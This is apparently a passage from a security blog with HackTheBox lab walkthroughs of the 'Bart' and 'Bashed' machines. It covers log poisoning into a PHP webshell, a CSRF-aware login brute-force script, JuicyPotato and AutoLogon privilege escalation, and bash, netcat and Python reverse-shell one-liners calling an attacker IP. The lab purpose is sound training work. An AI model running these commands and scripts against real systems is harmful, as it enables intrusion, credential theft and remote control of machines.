server.\nUse a proxy tool like FoxyProxy on FireFox to forward all the requests to the BurpSuite. Keep in mind that this is a HTTP proxy.\nWeb Enumeration Contd. Browsing to the sub-domain:\nGreat, it is working. Let\u0026rsquo;s check wappalyzer and see what it reports:\nIt identified IIS 10.0 and thus inferred the OS running is Windows Server, same as we did.\nIt identified that the web application running is WordPress v4.8.2, and since it has found that the web application is WordPress it has thus inferred that the DB running behind is a MySQL database server and the web technology being using is PHP.\nLet\u0026rsquo;s browse through the index page first before we do any further enumeration.\nWe see that there are three team members here, with their e-mail addresses, which we will make a note of along with their names and position. E-mail addresses within a corporate are usually in the same pattern, much like what we see here.\nWe go down a bit and find another emplpyee.\nWe can guess her e-mail address, based on the pattern that we found previously.\nWe will always look for comments when come across a web page, go to view source and search for \u0026lt;!--, which is what an HTML comment starts with.\nAlright, let\u0026rsquo;s take a look under the hood:\nAnd looks like we found another employee, and he\u0026rsquo;s a developer. Developer accounts are usually interesting because they would have quite some access to themselves which we could make good use of.\nLet\u0026rsquo;s look for some WordPress stuff. A WordPress website source will always be riddled with \u0026ldquo;wp-content\u0026rdquo; directories, which would tell us what plugins are being used and some other information.\nThere happened to be only one entry which was also commented out. It could be a fluke, let\u0026rsquo;s verify that by browsing to the admin panel - \u0026ldquo;wp-admin\u0026rdquo;.\nThe admin panel was also not accessible, if we would have ran an automated scan without checking things manually first we could have been left puzzled as to why the scan was erroring out.\nGeneral Enumeration Contd. Before we go any further, we must ensure that this is not entirely a rabbit hole, and to do so we will check the results of the all ports scan that we had executed earlier and see if there are any other ports that could possibly give us any more information.\nLooks like HTTP is the only service that we need to work with. If one was cautious they would run a UDP scan at this point.\nLet\u0026rsquo;s move on to the web enumeration.\nWeb Enumeration Contd. Since we could not find WordPress related content on the index page, there are two possiblities:\nWordPress content lies somewhere else, and is hidden, There is no WordPress here, and hunting for one would only waste our time. Now, since the index page does not lead us to any other page as well, let\u0026rsquo;s do some directory busting.\nIt seems like there is some kind of filtering in place so that every page browsed to is considered as a valid page on server by gobuster. Let\u0026rsquo;s check what this page is.\nJust an image, and it sure is useless. Let\u0026rsquo;s run the same command again, but do not consider \u0026ldquo;200 OK\u0026rdquo; responses from the server in the output.\nNote: If you do not know about HTTP Responses I\u0026rsquo;d highly suggest that you go through this document by Mozilla\nGreat we found two directories on the machines\u0026rsquo; IP - forum and monitor.\nAnother way that we could have done this, and a better way in my opinion, is by using wfuzz. Wfuzz is a fuzzing tool which could objectively be used for directory bruteforcing. It is not necessary that all \u0026ldquo;200 OK\u0026rdquo; responses would have resulted in that same useless image, it is plausible that the tool could have encountered a valid entry too with that reponse from the server.\nTo achieve this, we will first run the tool without any kind of filter on it, basically to capture that useless images\u0026rsquo; information.\nCommand sent:\nwfuzz -u http://10.10.10.81/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt\rThe results would start coming in, mostly just of that useless image but now we know long that image is, 630 lines, in terms of the webpage response that we get. We will now send the same command as before but we will ask the tool to not capture any response if the response returned has 630 lines of HTML code in it.\nAnd we found those directories again.\nNote that I started by directory busting from the root of the web server instead of starting it from a branch - forum.bart.htb. Although by performing directory busting on the forum subdomain could have resulted in some results, interesting or otherwise, it is essential that you always start your content discovery from the top and then later move forward to different subdomains or directories you found. This way you would get the best, more complete, picture of the service.\nALright, let\u0026rsquo;s check those directories out.\nThe directory /forum, upon checking, looks like it is the same as forum.bart.htb.\nThe directory /monitor, presents us with a login panel:\nLooks like there was no WordPress to begin with and just because the index page had some WordPress part Wappalyzer identified as it is leveraging the web application.\nAlso, we found a lead, which is great. What is even better is that we have a login panel to work with and we already have some users on our hand.\nIt looks like the login panel is using \u0026ldquo;PHP Server Monitor v3.2.1\u0026rdquo;, but when we go the website of that product we find that a version such as that does not exist:\nThe latest version that exists is v3.2.0, and as we all know, we have not found a way to travel to the future\u0026hellip; yet, so clearly application names and versions are being purposely modified to put us off the track.\nSince we have a login form on our hand, let\u0026rsquo;s try some default/common credentials and see if it lets us in.\nI tried a few default credentials but none of them worked, and neither is the login panel giving us a way to perform user enumeration.\nLet\u0026rsquo;s check out the \u0026ldquo;Forgot Password?\u0026rdquo; functionality:\nLooks like through the forgot password functionality we can perform user enumeration. Let\u0026rsquo;s use the list of names and email ID pattern to create a set of usernames. Some of the possibilities of the username pattern could be:\nPattern Example first-name robert first-namelast-name roberthilton first-name.last-name robert.hilton first-name-initial.last-name r.hilton first-name_last-name robert_hilton first-name-initial_last-name r_hilton These may not be the most exhaustive list of possiblities but are very good ones which are often seen around. We will create usernames as per the above patterns for each user we found and test each combination to ensure our test is complete and thorough.\nFirst testing with Samantha Brown (CEO), for each test case, and we find nothing. Next we will test for Daniel Simmons (Head of Sales), for each test case. While testing for the first test case, i.e. first-name, we found a hit for \u0026ldquo;daniel\u0026rdquo;. Since this test case brought a positive result, we will continue testing with just this test case for rest of the users. It\u0026rsquo;s weird for a sales personnel to have access to a server monitor.\nAnd as we go on we find another user - harvey:\nA developer having access to such a functionality seems completely normal than the previous one. Let\u0026rsquo;s try logging in with Harvey. Since this is a login form and now that we have a proper username I tried performing some basic SQL injections but that did not work at all. So let\u0026rsquo;s now try cracking the password.\nBefore we crack the password let\u0026rsquo;s take a look at the request that is sent to the server.\nSince CSRF tokens are employed here, and there will be a new token per request, we will need to make a bruteforcing script of our own to get pass this login portal. We will go into creating our own script in Beyond Root section. We could also do some guess work instead of making a script of our own and hope our guess is good enough, but, more often than not, they do not work.\nSome guesses for the password could be \u0026ldquo;password\u0026rdquo;, \u0026ldquo;password123\u0026rdquo;, \u0026ldquo;pass123\u0026rdquo;, \u0026ldquo;P@ssw0rd!\u0026rdquo;, \u0026ldquo;developer\u0026rdquo;, \u0026ldquo;developer@bart\u0026rdquo;, \u0026ldquo;bartdev\u0026rdquo;, \u0026ldquo;harvey\u0026rdquo;, \u0026ldquo;potter\u0026rdquo;, \u0026ldquo;harveypotter\u0026rdquo;, \u0026ldquo;harrypotter\u0026rdquo;.\nUpon trying these one after another, \u0026ldquo;potter\u0026rdquo; worked! Guess work can only get you so far, there could be a very good possibility none of these would have worked, and if they had not, the python script would have been our only hope.\nWhile it is trying to login, it was trying to redirect us to \u0026ldquo;monitor.bart.htb\u0026rdquo;, so let\u0026rsquo;s add that to our hosts file.\nNow that we have updated the hosts, let\u0026rsquo;s login again.\nAnd we now have access to the server monitor. There are a lot of tabs here, let\u0026rsquo;s browse through each.\nOn the very next tab we find another sub-domain so let\u0026rsquo;s go ahead and enter it in the hosts file as before.\nGreat, now let\u0026rsquo;s continue our enumeration on the monitor first and then we will move on to enumerating the internal-01 sub-domain. As a side-note, if the new sub-domain that we would have found, would have been, let\u0026rsquo;s say, internal-03, then we should definitely add internal-01, internal-02, as well as internal-03 and then enumerate each thoroughly.\nThere was no further information on the monitor sub-domain and so we will move on to the internal sub-domain. Browsing to the sub-domain:\nAnd we have landed to another login portal, one that states that it is used for internal purposes by their developer. This could potentially leak some sensitive information, could be credentials to some other place which devs use, could be some vulnerable internal code they are worried about and want to fix and so are discussing for the same, all kinds of stuff. Also, it seems that this has been made custom, and custom applications are usually broken in a form or another as they have not been vetted for numerous years.\nAnother thing that we should remember is that we already know two people who are most likely using this - Harvey, developer, and Robert, Head of IT.\nOne thing that bothered me is that as soon as we browsed to the sub-domain we were redirected to this \u0026ldquo;simple chat\u0026rdquo; application. We will have gobuster running in the background, we will first ensure that it is not being hindered by some kinda wildcard stuff like before, and then poke at this application manually.\ngobuster dir -u http://internal-01.bart.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o go_med_internal\rInitial Access Now that the script is doing its\u0026rsquo; job, let\u0026rsquo;s check the source of the login page:\nLet\u0026rsquo;s check out the CSS file.\nUsually names of developers of firms and other such details may be found withtin the source files and so are definitely worth a look. Let\u0026rsquo;s search for the same on Google:\nLooks like we already found the application being used here. Let\u0026rsquo;s take a deeper look:\nLet\u0026rsquo;s take a look at the contents of chat application:\nThere are two things that came to my mind:\nThis is a PHP application, it has a SQL folder, there is a possibility of an SQL injection here. We will know that from the code.\nThere is a register.php file present here, and so there is a possibility that this file is present on the target too, and if the functionality is present then we could just get ourselves register and access the application.\nUpon checking the code of multiple files, I ruled out the possiblity of an SQL injection here. Let\u0026rsquo;s see if the register.php is left on the server. Let\u0026rsquo;s check something more obvious, maybe a smiley from the media directory.\nLooks like there is a high possiblity that the unrequired files are kept on the server. Let\u0026rsquo;s check the register file.\nBrowsing to the /register.php, redirects us to the /register_form.php. Once the redirect is done, an internal serever error is thrown.\nFrom the responses from these two files we can be sure that they both exist on the server and will perform their intended purpose as per the developer, which is giving us an account.\nLet\u0026rsquo;s take a moment and understand how the registration is working here and how can we send a request to achieve the same.\nFrom the code, it looks like all we have to do is send two parameters in a POST request to the register.php file - uname (username) and passwd (password), and the password field has to be at least 8 characters long. I think we can pull that off.\nWe send a request that follows the code as above, and we get a 302 redirect to login.php, instead of register_form.php unlike before. Looks like a good sign\nUpon following redirection it definitely looks like we have been redirected to the login page. Let\u0026rsquo;s try logging in with this new credential noobsec : nothingtoseehere\nAnd we successfully log into the Internal Chat application. It looks like our favourite developer, Harvey, has left us some gift on the server. As always, let\u0026rsquo;s first check the source:\nThe above code is for the \u0026ldquo;Log\u0026rdquo; button on the chat page to save all the logs, let\u0026rsquo;s browse to the webpage ourselves\nAll it shows is \u0026ldquo;1\u0026rdquo;, I guess it could be a binary output showing that the logs have been updated. Let\u0026rsquo;s take a look at the log file.\nAnd our assumption was right, browsing to the webpage writes the logs to the text file. There are three entities per entry - date, username, user agent. We have direct access to the username so let\u0026rsquo;s modify that and see what happens.\nModifying the username does not help at all, it immediately responses with \u0026ldquo;0\u0026rdquo;. I\u0026rsquo;m now sure this shows whether the file log.php was able to write to log.txt or not, and that username is not modifiable.\nBrowsing to the log file shows us that we are right about username field, let\u0026rsquo;s modify the User-Agent field.\nI modified the User-Agent, sent the request, and we get the response we were hoping for. Let\u0026rsquo;s check the logs to ensure we were able to modify the field and get it written to the logs.\nLooks like we are in control of the User Agent field. Although we have a good news, we also have a bad news. Bad news is that we are writing to a text file, we cannot poison a text file. Sending a malicious payload to a text file will make no difference.\nUpon browsing to the log writing PHP file, it looks like it will take any file, and any username. But as we know, it did not let us modify the username field, let\u0026rsquo;s see if it is the same case with the filename parameter.\nModifying the PHP file to print phpinfo() upon loading, and sending the request. From the response we get we can say that we succeeded in writing to log.php file. Let\u0026rsquo;s check if that\u0026rsquo;s actually the case:\nBrowsing to the file and ensuring we have specified the filename and username parameter without which the page won\u0026rsquo;t load. We see the PHPInfo load immediately and thus can say that we were able to write to the file. We can use this knowledge to poison the file and have command execution in our hands.\nLet\u0026rsquo;s try one more thing else. We know that this script is writing to the files that already existed on the server, but can we write to a non-existent file?\nTo do so, I made the script write to noobsec.php, which we can be sure wouldn\u0026rsquo;t exist on the server, and we do get the \u0026ldquo;1\u0026rdquo; response indicating that this might have worked. Let\u0026rsquo;s check by browsing to /noobsec.php.\nAs the page loads up just fine we can say for sure that we can even create files on this server. Only purpose this could serve is that we wouldn\u0026rsquo;t have to modify already present files that could be critical to the server, and will be working with entirely different file, which even if it broke in worst possible way it would not affect the operations of the server and would be a much safer way of doing things.\nNote: The following operations are carried on the log.php file instead of this newly created file because this test idea had come while writing this write-up when everything was almost done.\nLet\u0026rsquo;s leverage our knowledge of being able to modify User Agent and writing to PHP file to exploit it. Putting a PHP webshell payload in the User-Agent field, and once sent we get a response that the write operation was successful.\nLet\u0026rsquo;s test if we have remote command execution. We send the simplest command, whoami, and we can see that it has successfully been executed. Nice, but we can do better - getting an interactive shell, which is what we will do now.\nWe will make use of Nishangs\u0026rsquo; Invoke-PowershellTcp.ps1 powershell reverse shell to get a shell on the system. Ensure you have mentioned the reverse shell command at the bottom of the file which once downloaded the target system will execute immediately.\n# Change IP and Port as required\rInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443\rOnce the file is prepared we will host on the python web server, I use my own alias to avoid typing all that.\nEnsure you have your shell listener active.\nOnce the file is being hosted, we can send the command to get it downloaded, Windows file transfer commands, and executed by the target system.\nChecking the listener, and sure enough, we got our low privileged shell. If you noticed, I used rlwrap to catch my shell here. Rlwrap provides a good amount of functionality - move cursor, maintain command history, clear terminal screen. When working with Windows shells it is hard to get a shell as functional as Linux where you can use Python to make it a fully interactive shell, unlike here.\nYou can learn more about rlwrap here.\nPrivilege Escalation Local Enumeration Script Let\u0026rsquo;s transfer a local enumeration script, winPEAS, on here and run it to see if we can find anything.\nWe have successfully transferred the file, let\u0026rsquo;s execute it. The script finishes and prints out all its\u0026rsquo; findings fairly quickly.\nIt found the excessive token privileges.\nIt also found some credentials and that too of Administrator. Let\u0026rsquo;s exploit both.\nPrivEsc 1 - Abusing Token Privileges - JuicyPotato 🥔 As soon as I get a shell the first thing that I do is check the privileges I have as the user:\nWe have the SeImpersonatePrivilege Enabled, which we could use to escalate our privileges to SYSTEM using JuicyPotato exploit. If you don\u0026rsquo;t know what the exploit is, you can read a gist about it here\nLet\u0026rsquo;s transfer the JuicyPotato.exe binary to the target machine. The exploit can be found in this repo\nOnce the binary is transferred, we will execute it as-is to have the usage printed out on the terminal.\nGreat, all we need right now is to transfer a program to the target machine for this exploit to execute. We don\u0026rsquo;t really need to do this, and can have an entire powershell command directly typed out, but this could cause some issue with the way the command is interepreted. Instead, we will have the same command in a bat file and have it executed, which also looks a lot cleaner.\nWe not only prepare the BAT file but also the shell that it would make the exploit download and execute. This shell is the same as the previous Nishang shell just on a different port.\nOnce that is done, we will have this BAT file transferred to the target machine and execute the exploit.\nLooks like the exploit has crashed. It did not work with the default CLSID, so we will look for one that will. To do so, we need to first know which version of Windows the target is.\nWe have a Windows 10 Pro on our hands, so we will look for CLSIDs in the same repo as earlier for this OS:\nI decided to test with the wuauserv, which is Windows Update Service. Not all services are necessary to be present in each OS, but some are crucial and would have a higher probability of existence in the system.\nWe will now run the command with this new CLSID that we have selected as below:\nAnd we have successfully executed the exploit. Let\u0026rsquo;s go take a look at our listener and see whether we fetched a SYSTEM shell or not:\nAnd we are SYSTEM! Amazing. We could now go fetch our flags but before that let\u0026rsquo;s take a look at our AutoLogon credentials and see what we can do with that.\nPrivEsc 2 - Abusing AutoLogon Credentials We have Administrators\u0026rsquo; credentials in the AutoLogon registry. It is important to note that although this password looks like a hash, it is not. AutoLogon credentials are never hashed, they\u0026rsquo;re in plaintext.\nWe could have found these credentials manually by executing the following command:\nreg query \u0026quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026quot; | findstr \u0026quot;DefaultUserName DefaultDomainName DefaultPassword\u0026quot;\rThe above command will only successfully work on a 64-bit shell.\nThe shell we got from the log poisoned RCE is a 32-bit process. We could check the same by doing the following:\nTo get a 64-bit shell, we transfer 64-bit netcat on to the target system and have it send us a fresh new shell.\nWe got a new shell and now let\u0026rsquo;s see if this one is a 64-bit process or not:\nLooks like it is. If you wanted to see the difference in output of just a single registry query could make between 32-bit process and 64-bit process, see the following screenshots:\nA lot of data is missed in the 32-bit one, including the one we care about the most - password. Since we can now fetch the password, let\u0026rsquo;s only print out what is necessary:\nNice, we now know how to get this value manually, so let\u0026rsquo;s exploit it.\nMethod 1 - SMBExec.py Since we know the administrators\u0026rsquo; password, we can log in as administrator using smbexec.py. Smbexec.py, winexe, PSExec, they all use port 445 to operate on. We will run the following command:\nsmbexec.py BART/Administrator:3130438f31186fbaf962f407711faddb@10.10.10.81\rBut once executed, the command will get stuck and fail. There is a possibility that the firewall must be stopping us from connecting to the SMB service. Since we already have a low privileged shell on the system, let\u0026rsquo;s forward the SMB port, 445, in order to be able to work with it.\nI\u0026rsquo;ll use chisel, a HTTP tunneling tool for port forward, download appropriate binaries from its\u0026rsquo; Git repo releases. We will first transfer the windows executable to the target system, and then have our chisel server listening for reverse connections:\nThese are the commands sent\nMethod 2 - Run-as We could also leverage the password in making a credentialed process. The usual runas command did not work for some odd reason but the one by 0xdf worked like a charm.\nEnsure you have your shell script hosted and listener running in the back.\nThe commands have also been added to the Windows privesc cheatsheet. The commands sent are:\n$username = \u0026quot;BART\\Administrator\u0026quot;\r$password = \u0026quot;3130438f31186fbaf962f407711faddb\u0026quot;\r$secstr = New-Object -TypeName System.Security.SecureString\r$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}\r$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr\rInvoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost\rThe commands have been executed, and the process has stuck which is a good sign. We move to our listener tab and check:\nAnd we have got an adminitrator shell. Great.\nMethod 3 - Net use While checking 0xdfs\u0026rsquo; write-up for the runas command turns out there was another way of getting access to the administrator owned files using net use. Although our objective here is to get admin or SYSTEM shell, we cannot ignore how crucial it could be in an engagement to be able to get hold of admin owned files.\nCommand sent:\nnet use x: \\\\localhost\\c$ /user:Administrator 3130438f31186fbaf962f407711faddb\rThe command tells the machine that create a new drive \u0026ldquo;x\u0026rdquo; which would be a copy of \\\\localhost\\c$ \u0026ldquo;share\u0026rdquo;, which is the C drive, as the user administrator and here is admins\u0026rsquo; password. The machine checks the validity of the credential we passed and since it is correct it creates a copy of the C drive in the X drive.\nThe copy has been created successfully, let\u0026rsquo;s see if we can access it.\nAnd sure enough, we were able to access admins\u0026rsquo; files while having a service account.\nFlags Now that we have rooted it in different ways, it is time we go get our loot:\nThere are a lot of directories here but we can make use of PowerShell to look for the file we want since we know the name of the file. The following command will recursively search for all the files in the C:\\Users\\ directory for any file that contains the string user.txt in it, if there are any errors then it will ignore it and keep going.\nCommand sent:\nGet-ChildItem -Path C:\\Users\\ -Include *user.txt* -Recurse -ErrorAction SilentlyContinue\rPost Exploitation We could stop after getting the flags but where\u0026rsquo;s the fun in that. We know there were two login panels so there must be at least two tables from which we could extract credentials from.\nSince we started our shell from simple chat application, let\u0026rsquo;s take a look at the database credentials:\nNow let\u0026rsquo;s take a look at the database credentials of the monitor application:\nGreat we got database credentials of both the applications, now all we have to do is extract the users\u0026rsquo; hashes.\nTo do so, we will first have to forward the MySQL port to us to be able to connect to it:\nNow that the port is forwarded we can freely connect to it using our Kali machine:\nThe information_schema table is an internal database for MySQL, we won\u0026rsquo;t bother looking into it since we already have access to the database. The internal_chat database consists of two tables, let\u0026rsquo;s get all the contents from both of them:\nNice, we even see the \u0026ldquo;noobsec\u0026rdquo; user I\u0026rsquo;d created earlier. We could crack these hashes for later use. Now that we have gotten all the data from this database, let\u0026rsquo;s take a look at the monitor database:\nSince we know that the monitor application was using the sysmon database, we will first look into it. Let\u0026rsquo;s dump the contents of the _users table:\nLooks like we selected the right table to dump creds from, we could add these hashes to our cracking list as well. Since there was a forum database too, although there was no place in that sub-domain to login, let\u0026rsquo;s take a look at it:\nThere happens to be a sole user in this table - bobby. We could add this one to our cracking list as well.\nBeyond Root Log Poisoning Analysis FOllowing are the contents of the log.php file:\n\u0026lt;?php ini_set(\u0026quot;display_errors\u0026quot;, 1);\rerror_reporting(E_ALL;\r// List of users (Can't be arsed of getting them from the DB!) $users = array(\r\u0026quot;daniel\u0026quot;,\r\u0026quot;harvey\u0026quot;,\r\u0026quot;bobby\u0026quot; );\r// Extensions not allowed\r$disallowedExtensions = array(\r\u0026quot;jsp\u0026quot;,\r\u0026quot;exe\u0026quot;\r);\r$userAgent = $_SERVER['HTTP_USER_AGENT'];\r$filename = $_GET['filename'];\r$username = $_GET['username'];\r$_SESSION['user_agent'] = $userAgent;\r// Check extension (Temporarly disabled)\r/*$explodedFilename = !is_null($filename) ? explode(\u0026quot;.\u0026quot;, $filename) : array();\rif(!empty($explodedFilename) \u0026amp;\u0026amp; in_array($explodedFilename [1], $disallowedExtensions))\r{\recho 0;\rdie();\r}*/\r// Check if user is valid\rif(!in_array($username, $users))\r{\recho 0;die();\r}\r// Check if file exists\r//if(!file_exists($filename))\r//{\r$string = \u0026quot;[\u0026quot; . date(\u0026quot;Y-m-d H:i:s\u0026quot;, time()) . \u0026quot;] - \u0026quot; . $username . \u0026quot; - \u0026quot; . $userAgent;\rfile_put_contents($filename, $string, FILE_APPEND);\recho 1;\r//}\r//else\r//{\r// echo 0;\r//}\r?\u0026gt;\rBy reading the code do we not only understand what makes the code vulnerable but also what could be done to make it secure.\nLet\u0026rsquo;s first understand the code:\nThe code starts off by making an array of usernames, hardcoding them, with which the logs will be saved. Next it defines a set of extensions that must be disallowed. It takes User-Agent, filename, username directly from the user input and passes it on to the PHP variables without any sanitization. The file extension check has been commented out, and so there will be no check against any unwanted file extensions that a malicious user could send in Next a username check is performed, and only those are accepted which are in the array defined above. A check against file exists or not is commented out. The check done looks like it would have done exactly the opposite than what was intended, i.e. appending to the file only if it does not exist, and if it does, print \u0026ldquo;0\u0026rdquo; Now let\u0026rsquo;s talk about where it went wrong:\nInstead of having a disallowed extensions array, an allow extension array should have been kept. Trusting user input and passing it directly to the PHP variables to user. This allowed us to pass whatever we wanted in the User-Agent header. Removing file exist check also allowed to create files on the server. Brute Forcing Script My script was shabby and not so aesthetically pleasing, so I took some parts of mine (CSRF token regex, setting cookies, session generation, not expanding wordlist) and stuck it in 0xdfs\u0026rsquo; script. You can check out his script here\nYou can download my script from my scripts repo\n#!/usr/bin/env python3\rimport re\rimport requests\rimport sys\rfrom multiprocessing import Pool\r# Definitions / constants\rMAX_PROC = 50\rurl = \u0026quot;http://monitor.bart.htb/\u0026quot;\rcsrf_re = 'name=\u0026quot;csrf\u0026quot; value=\u0026quot;(.*)\u0026quot;'\rusername = \u0026quot;harvey\u0026quot;\r# Start a session, it automatically takes the cookies from response and uses it for requests\rs = requests.Session()\rdef usage():\rprint(\u0026quot;{} \u0026lt;wordlist\u0026gt;\u0026quot;.format(sys.argv[0]))\rprint(\u0026quot;wordlist should be one word per line\u0026quot;)\rsys.exit(1)\r# Gets CSRF token, uses that to send a login request, returns if it worked or not\rdef brute(password):\rr = s.get(url)\rcsrf = re.findall(csrf_re, r.text)[0]\rdata = {\u0026quot;csrf\u0026quot;: csrf,\r\u0026quot;user_name\u0026quot;: username,\r\u0026quot;user_password\u0026quot;: password,\r\u0026quot;action\u0026quot;:\u0026quot;login\u0026quot;}\rr = s.post(url, data=data)\rif \u0026quot;The information is incorrect\u0026quot; in r.text:\rreturn password, False\relse:\rreturn password, True\r# Taking the words, sending it to brute function using multiprocessing\rdef main(wordlist, nprocs=MAX_PROC):\rwith open(wordlist, 'r', encoding='latin-1') as f:\rwords = f.read().rstrip().replace('\\r','').split('\\n')\rpool = Pool(processes=nprocs)\ri=0\rprint_status(0,len(words))\rfor password, status in pool.imap_unordered(brute, [passwd for passwd in words]):\rif status:\rsys.stdout.write(\u0026quot;\\n[+] Found password: {} \\n\u0026quot;.format(password))\rpool.terminate()\rsys.exit(0)\relse:\ri += 1\rprint_status(i, len(words))\rprint(\u0026quot;\\n\\n[-] Password not found\\n\u0026quot;)\r# ~a e s t h e t i c s~\rdef print_status(i, l, max=30):\rsys.stdout.write(\u0026quot;\\r|{}\u0026gt;{}| {:\u0026gt;15}/{}\u0026quot;.format( \u0026quot;=\u0026quot; * ((i * max)//l), \u0026quot; \u0026quot; * (max - ((i * max)//l)), i, l))\rif __name__ == '__main__':\rif len(sys.argv) != 2:\rusage()\rmain(sys.argv[1])\rThe script requires you to make it executable. Once the script is run as-is, it will throw the usage out:\nFor the demo I have used a super small wordlist, the script will show the number of request to be made, the arrow goes further towards the completion per request, and once found it will break out and print out the password on the terminal, like below:\nIf you have trouble understanding which interal function does what, Python documentation is a fantastic resource to check out.\nLessons Learned Do not leave functionalities lying on the server if it is not required, they can be abused Ensure there is a rate limiting feature to your login portals. No need to provide verbose errors (user enumeration), always generalize the error messages Ensure necessary checks are put when dealing with user input, it should never be trusted. Differences in a 32-bit and 64-bit shells Fin If you did not understand something, have some suggestion, or found some error, feel free to contact me :) Take care and keep hacking, folks!\n","permalink":"http://localhost:1313/hackthebox/htb-bart/","title":"HackTheBox - Bart Writeup w/o Metasploit"},{"content":"HackTheBox - Bashed Writeup w/o Metasploit Introduction Bashed is a retired HackTheBox machine, rated easy and rightfully so. We go from finding a hidden web shell to quickly gaining root due to over privileged users. I present a small discussion at the end of the write-up that I had with some folks on what steps could be taken to secure something like this on a corporate level, not really necessary but fun.\nBox Details\rReconnaissance General Enumeration Starting the enumeration with an initial Nmap scan.\nWe only have port 80 open, which doesn\u0026rsquo;t tell us much. Let\u0026rsquo;s perform a targeted scan on this port.\nNice, we got some information. If you look at the service name it identified it is \u0026ldquo;tcpwrapped\u0026rdquo;, this could indicate that the service, HTTP in this case, is protected by tcpwrapper. You can read more about \u0026ldquo;tcpwrapped\u0026rdquo; here.\nIt gave us the web server version as well as the title of the index page.\nNow let\u0026rsquo;s have an all port scan running in the background before we poke the HTTP service manually.\nnmap -Pn -n -p- -oN nmap/allports 10.10.10.68\rHTTP Enumeration Now that the scan is running, let\u0026rsquo;s take a look at the web service manually.\nLet\u0026rsquo;s get the server version manually first, using curl.\nLet\u0026rsquo;s get the server version by browsing to some non-existent page.\nAnd we got the version as well as the OS the target is running. If you are wondering whether we could pinpoint which version of the OS is running, then yes, we can.\nTo do so, we will Google \u0026ldquo;Ubuntu httpd launchpad\u0026rdquo; and the very first link was exactly what we wanted, all the Apace2 versions to their respective Ubuntu versions. \u0026ldquo;httpd\u0026rdquo; is just another term for the Apache HTTP Server.\nWe found the OS version that this version of Apache server belongs to. Another Google search tells us that \u0026ldquo;Xenial Xerus\u0026rdquo; is Ubuntu 16.04 LTS. If it was some old OS, you could look up exploits regarding the same.\nAnother enumeration tool for websites is \u0026ldquo;wappalyzer\u0026rdquo;, a browser plugin which you can download from here, it tells you which technologies are being used on the website.\nWappalyzer can help you detect web server (Apache, Nginx, etc.), web application (WordPress, Magento, Drupal, etc.), web technologies (like PHP), and database servers (like MySQL) too. Everything is based on \u0026ldquo;fingerprints\u0026rdquo; and is not necessary that they\u0026rsquo;re right all the time, you should know how to identify these or verify the information that has been given to you by some tool.\nNow that we have gotten hold of the server and version information, let\u0026rsquo;s take a look at the website.\nLooks like the developer, Arrexel, has created a PHP web shell for their own pentesting purposes, and states that it was \u0026ldquo;developed on this exact server!\u0026rdquo; This indicates that there\u0026rsquo;s a high possibility that this web shell is present somewhere on the server.\nFun fact: Arrexel is the creator of this machine.\nBefore we go any further, we will have a content brute-forcer, gobuster, run on the server to find any hidden directories.\nCommand sent:\ngobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o go_med\rLet\u0026rsquo;s check out the only post that is there, /single.html, while our gobuster is running in the background.\nThe link to the the phpbash web shell is provided.\nWeb shells often are protected with some kind of default password, upon checking the php web shell we now that this web shell is not password protected.\nLet\u0026rsquo;s check if the gobuster has found anything.\nThere are few interesting directories found:\n/php /dev /uploads After checking out each, /dev was the only interesting directory, which had the phpbash web shell in it.\nLet\u0026rsquo;s see if it is actually working.\nLooks like it does work. Before we go any further, let\u0026rsquo;s take a look at our complete port scan to ensure we are not rushing into something while leaving some information out.\nUpon checking the results, there was only port 80 open. We can be sure that we haven\u0026rsquo;t missed anything.\nInitial Access Although we do have access to a web shell and a rather nice one, the web shell is only semi-functional. So let\u0026rsquo;s get a reverse shell and then make it functional.\nSince there\u0026rsquo;s already a semi-functional shell on our hand we will send in reverse shell spawn commands from my cheatsheet\nEnsure you have your listener on before you start sending in your reverse shell command:\nsudo nc -nvlp 443\rBefore you start sending in reverse shell check what your IP is, I have messed this one too many times and kept wondering what\u0026rsquo;s wrong.\nTesting with bash reverse shell:\n/bin/bash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.11/443 0\u0026gt;\u0026amp;1\u0026quot;\rChecking the listener after sending the command, nothing. Ok, no problem, let\u0026rsquo;s try another one.\nLet\u0026rsquo;s check if it has nc present with the following command:\nwhich nc\rIt is necessary to first check if the binary you want to leverage even exists or not on the target system. The above command prints out the location of nc on the system, great, let\u0026rsquo;s test it out.\nTesting with nc reverse shell:\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2\u0026gt;\u0026amp;1 | nc 10.10.14.11 443 \u0026gt; /tmp/f\rChecked the listener and still nothing, there surely is something in place that is killing our connection.\nLet\u0026rsquo;s try one last thing, python, before resorting to a php reverse shell file.\nChecking if python exists:\nwhich python\rIt does. Great, let\u0026rsquo;s test our python reverse shell:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.11\u0026quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'\rChecked the listener and viola! We got a reverse shell.\nThink about and perhaps even test how else could you have gained a reverse shell.\nPrivilege Escalation Now that we have a reverse shell, let\u0026rsquo;s first make it functional.\nI\u0026rsquo;d have ideally started this step by first checking if the system had python or not, but we already knew that it did. By executing those commands, which can also be found here, you gain a fully interactive shell and can use tab auto-completion, CTRL+C to break out of some command and also be able to use special commands like su.\nNow that our shell is interactive, let\u0026rsquo;s transfer an enumeration script and execute it. In this I\u0026rsquo;ll be using LinEnum, which can be found here.\nFirst we will host the script using python HTTP server:\nThen we will download the file using wget:\nWe also turn the execute bit on, and then finally execute the script.\nAs soon as the script is executed, a lot of data is dumped on the screen. We will go at the top where the script was executed and start interpreting the data dumped out.\nPrivilege Escalation 1 - www-data to scriptmanager We pretty soon come across some interesting stuff:\nAs www-data user, it is very rare to have any sudo privileges. Here it seems that we can sudo anything as scriptmanager user. So we will change our user to scriptmanager by having sudo spawn a shell as 